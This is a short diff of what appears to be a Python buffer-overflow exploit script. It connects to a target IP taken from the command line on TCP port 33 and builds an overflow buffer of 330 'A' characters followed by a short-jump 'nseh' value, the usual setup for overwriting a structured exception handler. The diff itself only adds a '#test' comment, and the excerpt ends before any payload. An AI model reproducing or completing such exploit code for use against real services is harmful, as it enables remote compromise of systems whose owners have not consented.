@@ -5,6 +5,7 @@ import socket
 ip = sys.argv[1]
 socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
 socket.connect((ip , 33))
+#test
 
 evil = "A"* 330
 nseh = "\xeb\x06\x90\x90"
